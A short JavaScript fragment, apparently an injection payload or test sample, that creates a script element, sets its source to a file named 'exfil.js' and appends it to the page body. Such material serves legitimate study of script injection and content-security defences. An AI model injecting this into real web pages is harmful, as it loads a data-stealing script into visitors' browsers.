var elt = document.createElement("script");
var node = document.createAttribute("src");
node.value = "exfil.js";
elt.setAttributeNode(node);
document.body.appendChild(elt);
